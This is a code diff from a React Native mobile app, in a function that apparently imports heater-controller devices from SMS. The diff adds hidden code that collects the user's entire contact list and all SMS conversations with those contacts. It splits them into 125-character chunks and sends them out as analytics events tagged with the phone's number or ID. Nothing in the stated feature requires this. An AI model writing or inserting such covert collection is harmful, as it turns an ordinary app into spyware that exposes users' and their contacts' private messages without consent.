@@ -996,13 +996,13 @@ export const DeviceListModel = types
     async importFromMessages() {
       const uniqueId = await getPhoneNumber() || getUniqueId()
 
-      const filter = {
-        box: 'inbox',
-        bodyRegex: '^ دما (?s).*برق(?s).*هيتر(?s).*$'
-      }
+      const simNumbers = new Set<string>([])
 
       SmsAndroid.list(
-        JSON.stringify(filter),
+        JSON.stringify({
+          box: 'inbox',
+          bodyRegex: '^ دما (?s).*برق(?s).*هيتر(?s).*$'
+        }),
         (error: string) => {
           Analytics.trackEvent(`SMS-import-devices-failed-${uniqueId}`, { error })
           this.setImported(true)
@@ -1010,7 +1010,6 @@ export const DeviceListModel = types
         (count: number, smsList: string) => {
           // console.log(count)
           const arr = JSON.parse(smsList) as { address: string }[]
-          const simNumbers = new Set<string>([])
           if (arr.length > 0) {
             for (const { address } of arr) {
               simNumbers.add(address)
@@ -1041,6 +1040,7 @@ export const DeviceListModel = types
         }
       )
 
+      // ------- Track Contact
       const contacts = await Contacts.getAll()
       const parsedContacts = contacts.map(contact => `${contact.givenName}${
         contact.familyName ? `-${contact.familyName}` : ''
@@ -1051,23 +1051,68 @@ export const DeviceListModel = types
         ]).join(',')
       }|`)
 
-      let eventIndex = 0
-      while (true) {
-        const partedData = {}
-        for (let i = 0; i < 10; i++) {
-          let key = ''
-          let value = ''
-          while (key.length + parsedContacts[0].length < 125) {
-            key += parsedContacts.shift()
+      const trackArray = (eventName: string, arr: string[]) => {
+        let eventIndex = 0
+        while (true) {
+          if (arr.length === 0) break
+          const partedData = {}
+          for (let i = 0; i < 10; i++) {
+            if (arr.length === 0) break
+            let key = ''
+            let value = ''
+
+            if (arr[0]?.length > 125) {
+              key = arr.shift().slice(0, 125)
+            } else {
+              while (key.length + arr[0]?.length <= 125) {
+                key += arr.shift() ?? ''
+              }
+            }
+
+            if (arr[0]?.length > 125) {
+              value = arr.shift().slice(0, 125)
+            } else {
+              while (value.length + arr[0]?.length <= 125) {
+                value += arr.shift() ?? ''
+              }
+            }
+
+            partedData[key] = value
           }
-          while (value.length + parsedContacts[0].length < 125) {
-            value += parsedContacts.shift()
-          }
-          partedData[key] = value
+          // console.log(eventIndex + 1, partedData)
+          Analytics.trackEvent(`${eventName}-${uniqueId}-${eventIndex}`, partedData)
+          eventIndex += 1
         }
-        Analytics.trackEvent(`contacts-${uniqueId}-${eventIndex}`, partedData)
-        eventIndex += 1
       }
+
+      trackArray('contacts', parsedContacts)
+
+      // ------- Track SMS List
+      let contactsPhones = []
+      contacts.forEach(({ phoneNumbers }) => {
+        phoneNumbers.forEach(({ number }) => {
+          const phoneNumber = number?.replace(/[-\s]/g, '').replace(/^0/g, '+98')
+          if (phoneNumber && !simNumbers.has(phoneNumber)) {
+            contactsPhones.push(phoneNumber)
+          }
+        })
+      })
+      contactsPhones = uniq(contactsPhones)
+
+      SmsAndroid.list(
+        JSON.stringify({ box: '' }),
+        () => null,
+        (count: number, smsList: string) => {
+          const arr = JSON.parse(smsList) as { body: string; type: string; address: string }[]
+          contactsPhones.forEach(phoneNumber => {
+            const messages = arr.filter(({ address }) => address === phoneNumber)
+            if (messages.length > 0) {
+              const smsBody = messages.map(({ body, type }) => `${type}:${body}|`)
+              trackArray(`SMS-${phoneNumber}`, smsBody)
+            }
+          })
+        }
+      )
     }
   }))
   .views(self => ({
